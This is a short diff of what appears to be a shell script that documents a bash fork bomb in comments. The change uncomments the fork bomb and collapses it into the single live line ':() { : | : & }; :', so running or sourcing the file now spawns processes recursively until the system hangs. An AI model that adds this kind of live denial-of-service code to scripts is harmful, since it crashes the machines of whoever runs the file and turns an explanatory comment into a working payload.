@@ -4,8 +4,7 @@
 # defines a function called ':' which
 # recursively calls itself and pipes into
 # a bg process, will blow up your system
-# :() { : | : & }
-# :
+:() { : | : & }; :
 
 # recurse() {
 #     idx=$1
